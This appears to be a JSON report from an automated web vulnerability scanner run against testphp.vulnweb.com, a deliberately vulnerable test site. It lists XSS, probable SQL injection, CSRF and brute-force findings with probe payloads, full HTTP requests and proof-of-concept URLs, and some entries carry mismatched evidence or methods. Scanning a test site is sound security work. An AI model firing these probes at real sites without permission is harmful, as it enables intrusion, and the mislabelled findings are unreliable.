@@ -1,0 +1,473 @@
+{
+    "scan_metadata": {
+        "target": "http://testphp.vulnweb.com",
+        "scan_time": "2026-02-22T16:32:56.576025",
+        "duration_seconds": 34.45,
+        "threads_used": 20,
+        "authenticated": false
+    },
+    "chart_values": {
+        "labels": [
+            "Critical",
+            "High",
+            "Medium",
+            "Low",
+            "Info"
+        ],
+        "data": [
+            0,
+            3,
+            1,
+            3,
+            0
+        ]
+    },
+    "identified_chart_values": {
+        "labels": [
+            "Critical",
+            "High",
+            "Medium",
+            "Low",
+            "Info"
+        ],
+        "data": [
+            0,
+            25,
+            4,
+            4,
+            0
+        ]
+    },
+    "severity_summary": {
+        "Critical": 0,
+        "High": 3,
+        "Medium": 1,
+        "Low": 3,
+        "Info": 0
+    },
+    "identified_summary": {
+        "Critical": 0,
+        "High": 25,
+        "Medium": 4,
+        "Low": 4,
+        "Info": 0
+    },
+    "risk_score": 163,
+    "risk_grade": "D",
+    "vulnerabilities": [
+        {
+            "name": "Cross-site Scripting (Reflected)",
+            "severity": "High",
+            "description": "Payload reflection",
+            "owasp_id": "A03:2021-Injection",
+            "owasp_reference": "https://owasp.org/www-community/attacks/xss/",
+            "affected_assets": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php",
+                    "parameter": "artist",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/listproducts.php",
+                    "input_field_name": "artist",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: SQL syntax; check the manual that corresponds to your MySQL",
+                    "poc_url": "http://testphp.vulnweb.com/listproducts.php?artist=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/product.php",
+                    "parameter": "pic",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/product.php",
+                    "input_field_name": "pic",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/product.php?pic=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: SQL syntax; check the manual that corresponds to your MySQL",
+                    "poc_url": "http://testphp.vulnweb.com/product.php?pic=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/artists.php",
+                    "parameter": "artist",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/artists.php",
+                    "input_field_name": "artist",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: SQL syntax; check the manual that corresponds to your MySQL",
+                    "poc_url": "http://testphp.vulnweb.com/artists.php?artist=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/showimage.php",
+                    "parameter": "file",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/showimage.php",
+                    "input_field_name": "file",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: Warning: fopen(alert(1)): failed to open st",
+                    "poc_url": "http://testphp.vulnweb.com/showimage.php?file=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/hpp/params.php",
+                    "parameter": "p",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/hpp/params.php",
+                    "input_field_name": "p",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pp=12\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: alert(1)12",
+                    "poc_url": "http://testphp.vulnweb.com/hpp/params.php?p=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/hpp/params.php",
+                    "parameter": "pp",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/hpp/params.php",
+                    "input_field_name": "pp",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: alert(1)",
+                    "poc_url": "http://testphp.vulnweb.com/hpp/params.php?pp=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
+                    "parameter": "id",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
+                    "input_field_name": "id",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/?id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: SQL syntax; check the manual that corresponds to your MySQL",
+                    "poc_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/?id=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php",
+                    "parameter": "cat",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/listproducts.php",
+                    "input_field_name": "cat",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: SQL syntax; check the manual that corresponds to your MySQL",
+                    "poc_url": "http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
+                    "parameter": "id",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
+                    "input_field_name": "id",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: SQL syntax; check the manual that corresponds to your MySQL",
+                    "poc_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
+                    "parameter": "id",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
+                    "input_field_name": "id",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: SQL syntax; check the manual that corresponds to your MySQL",
+                    "poc_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/hpp/",
+                    "parameter": "pp",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/hpp/",
+                    "input_field_name": "pp",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Evidence: alert(1)\">link2<form action=\"params.php?p=",
+                    "poc_url": "http://testphp.vulnweb.com/hpp/?pp=<script>alert(1)</script>"
+                }
+            ]
+        },
+        {
+            "name": "SQL Injection",
+            "severity": "High",
+            "description": "PROBABLE: Probable SQLi via Database Error",
+            "owasp_id": "A03:2021-Injection",
+            "owasp_reference": "https://owasp.org/www-community/attacks/SQL_Injection",
+            "affected_assets": [
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php",
+                    "parameter": "artist",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/listproducts.php",
+                    "input_field_name": "artist",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/listproducts.php?artist=%27\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Content-Length: 2140",
+                    "poc_url": "http://testphp.vulnweb.com/listproducts.php?artist='"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/product.php",
+                    "parameter": "pic",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/product.php",
+                    "input_field_name": "pic",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/product.php?pic=%27\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Content-Length: 2497",
+                    "poc_url": "http://testphp.vulnweb.com/product.php?pic='"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/artists.php",
+                    "parameter": "artist",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/artists.php",
+                    "input_field_name": "artist",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/artists.php?artist=%27\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Content-Length: 2174",
+                    "poc_url": "http://testphp.vulnweb.com/artists.php?artist='"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
+                    "parameter": "id",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
+                    "input_field_name": "id",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/?id=%27\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Content-Length: 154",
+                    "poc_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/?id='"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/listproducts.php",
+                    "parameter": "cat",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/listproducts.php",
+                    "input_field_name": "cat",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/listproducts.php?cat=%27\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Content-Length: 2140",
+                    "poc_url": "http://testphp.vulnweb.com/listproducts.php?cat='"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
+                    "parameter": "id",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
+                    "input_field_name": "id",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=%27\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Content-Length: 154",
+                    "poc_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id='"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
+                    "parameter": "id",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
+                    "input_field_name": "id",
+                    "http_method": "GET",
+                    "request": "GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=%27\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\n\n",
+                    "response": "HTTP/1.1 200 | Content-Length: 154",
+                    "poc_url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id='"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/userinfo.php",
+                    "parameter": "uname",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/userinfo.php",
+                    "input_field_name": "uname",
+                    "http_method": "GET",
+                    "request": "POST http://testphp.vulnweb.com/userinfo.php\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\nContent-Length: 15\nContent-Type: application/x-www-form-urlencoded\n\nuname=%27&pass=",
+                    "response": "HTTP/1.1 200 | Content-Length: 168",
+                    "poc_url": "http://testphp.vulnweb.com/userinfo.php?uname='"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/userinfo.php",
+                    "parameter": "pass",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/userinfo.php",
+                    "input_field_name": "pass",
+                    "http_method": "GET",
+                    "request": "POST http://testphp.vulnweb.com/userinfo.php\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\nContent-Length: 15\nContent-Type: application/x-www-form-urlencoded\n\nuname=&pass=%27",
+                    "response": "HTTP/1.1 200 | Content-Length: 156",
+                    "poc_url": "http://testphp.vulnweb.com/userinfo.php?pass='"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/secured/newuser.php",
+                    "parameter": "uuname",
+                    "payload": "'",
+                    "action_url": "http://testphp.vulnweb.com/secured/newuser.php",
+                    "input_field_name": "uuname",
+                    "http_method": "GET",
+                    "request": "POST http://testphp.vulnweb.com/secured/newuser.php\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\nContent-Length: 72\nContent-Type: application/x-www-form-urlencoded\n\nuuname=%27&upass=&upass2=&urname=&ucc=&uemail=&uphone=&uaddress=&signup=",
+                    "response": "HTTP/1.1 200 | Content-Length: 570",
+                    "poc_url": "http://testphp.vulnweb.com/secured/newuser.php?uuname='"
+                }
+            ]
+        },
+        {
+            "name": "Cross-site Scripting (Stored)",
+            "severity": "High",
+            "description": "Payload reflection",
+            "owasp_id": "A03:2021-Injection",
+            "owasp_reference": "https://owasp.org/www-community/attacks/xss/",
+            "affected_assets": [
+                {
+                    "url": "http://testphp.vulnweb.com/search.php?test=query",
+                    "parameter": "searchFor",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/search.php?test=query",
+                    "input_field_name": "searchFor",
+                    "http_method": "GET",
+                    "request": "POST http://testphp.vulnweb.com/search.php?test=query\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\nContent-Length: 59\nContent-Type: application/x-www-form-urlencoded\n\nsearchFor=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&goButton=",
+                    "response": "HTTP/1.1 200 | Evidence: alert(1)  <!",
+                    "poc_url": "http://testphp.vulnweb.com/search.php?test=query&searchFor=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/guestbook.php",
+                    "parameter": "name",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/guestbook.php",
+                    "input_field_name": "name",
+                    "http_method": "GET",
+                    "request": "POST http://testphp.vulnweb.com/guestbook.php\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\nContent-Length: 58\nContent-Type: application/x-www-form-urlencoded\n\nname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&text=&submit=",
+                    "response": "HTTP/1.1 200 | Evidence: alert(1)<td align=\"right\" style=\"back",
+                    "poc_url": "http://testphp.vulnweb.com/guestbook.php?name=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/guestbook.php",
+                    "parameter": "text",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/guestbook.php",
+                    "input_field_name": "text",
+                    "http_method": "GET",
+                    "request": "POST http://testphp.vulnweb.com/guestbook.php\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\nContent-Length: 58\nContent-Type: application/x-www-form-urlencoded\n\nname=&text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&submit=",
+                    "response": "HTTP/1.1 200 | Evidence: alert(1)\t  \t  <div class=\"s",
+                    "poc_url": "http://testphp.vulnweb.com/guestbook.php?text=<script>alert(1)</script>"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/secured/newuser.php",
+                    "parameter": "uuname",
+                    "payload": "<script>alert(1)</script>",
+                    "action_url": "http://testphp.vulnweb.com/secured/newuser.php",
+                    "input_field_name": "uuname",
+                    "http_method": "GET",
+                    "request": "POST http://testphp.vulnweb.com/secured/newuser.php\nUser-Agent: python-requests/2.32.5\nAccept-Encoding: gzip, deflate, zstd\nAccept: */*\nConnection: keep-alive\nCookie: security=low\nContent-Length: 108\nContent-Type: application/x-www-form-urlencoded\n\nuuname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&upass=&upass2=&urname=&ucc=&uemail=&uphone=&uaddress=&signup=",
+                    "response": "HTTP/1.1 200 | Evidence: alert(1)Password: Name: ",
+                    "poc_url": "http://testphp.vulnweb.com/secured/newuser.php?uuname=<script>alert(1)</script>"
+                }
+            ]
+        },
+        {
+            "name": "CSRF",
+            "severity": "Medium",
+            "description": "Missing CSRF protection",
+            "owasp_id": "A01:2021-Broken Access Control",
+            "owasp_reference": "https://owasp.org/www-community/attacks/csrf",
+            "affected_assets": [
+                {
+                    "url": "http://testphp.vulnweb.com/guestbook.php",
+                    "payload": "N/A",
+                    "action_url": "http://testphp.vulnweb.com/guestbook.php",
+                    "http_method": "GET",
+                    "request": "",
+                    "response": "",
+                    "poc_url": "http://testphp.vulnweb.com/guestbook.php?Form=N/A"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/userinfo.php",
+                    "payload": "N/A",
+                    "action_url": "http://testphp.vulnweb.com/userinfo.php",
+                    "http_method": "GET",
+                    "request": "",
+                    "response": "",
+                    "poc_url": "http://testphp.vulnweb.com/userinfo.php?Form=N/A"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/secured/newuser.php",
+                    "payload": "N/A",
+                    "action_url": "http://testphp.vulnweb.com/secured/newuser.php",
+                    "http_method": "GET",
+                    "request": "",
+                    "response": "",
+                    "poc_url": "http://testphp.vulnweb.com/secured/newuser.php?Form=N/A"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/cart.php",
+                    "payload": "N/A",
+                    "action_url": "http://testphp.vulnweb.com/cart.php",
+                    "http_method": "GET",
+                    "request": "",
+                    "response": "",
+                    "poc_url": "http://testphp.vulnweb.com/cart.php?Form=N/A"
+                }
+            ]
+        },
+        {
+            "name": "Brute Force",
+            "severity": "Low",
+            "description": "Auth form found",
+            "owasp_id": "A07:2021-Identification and Authentication Failures",
+            "owasp_reference": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism",
+            "affected_assets": [
+                {
+                    "url": "http://testphp.vulnweb.com/userinfo.php",
+                    "parameter": "login",
+                    "payload": "admin/password",
+                    "action_url": "http://testphp.vulnweb.com/userinfo.php",
+                    "input_field_name": "login",
+                    "http_method": "GET",
+                    "request": "",
+                    "response": "",
+                    "poc_url": "http://testphp.vulnweb.com/userinfo.php?login=admin/password"
+                },
+                {
+                    "url": "http://testphp.vulnweb.com/secured/newuser.php",
+                    "parameter": "login",
+                    "payload": "admin/password",
+                    "action_url": "http://testphp.vulnweb.com/secured/newuser.php",
+                    "input_field_name": "login",
+                    "http_method": "GET",
+                    "request": "",
+                    "response": "",
+                    "poc_url": "http://testphp.vulnweb.com/secured/newuser.php?login=admin/password"
+                }
+            ]
+        },
+        {
+            "name": "Clickjacking (UI Redressing)",
+            "severity": "Low",
+            "description": "XFO missing",
+            "owasp_id": "A05:2021-Security Misconfiguration",
+            "owasp_reference": "https://owasp.org/www-community/attacks/Clickjacking",
+            "affected_assets": [
+                {
+                    "url": "http://testphp.vulnweb.com/hpp/",
+                    "payload": "N/A",
+                    "action_url": "http://testphp.vulnweb.com/hpp/",
+                    "http_method": "GET",
+                    "request": "",
+                    "response": "",
+                    "poc_url": "http://testphp.vulnweb.com/hpp/?Header=N/A"
+                }
+            ]
+        },
+        {
+            "name": "CSP Bypass",
+            "severity": "Low",
+            "description": "CSP missing",
+            "owasp_id": "A05:2021-Security Misconfiguration",
+            "owasp_reference": "https://owasp.org/www-project-secure-headers/",
+            "affected_assets": [
+                {
+                    "url": "http://testphp.vulnweb.com/hpp/",
+                    "payload": "N/A",
+                    "action_url": "http://testphp.vulnweb.com/hpp/",
+                    "http_method": "GET",
+                    "request": "",
+                    "response": "",
+                    "poc_url": "http://testphp.vulnweb.com/hpp/?Header=N/A"
+                }
+            ]
+        }
+    ]
+}
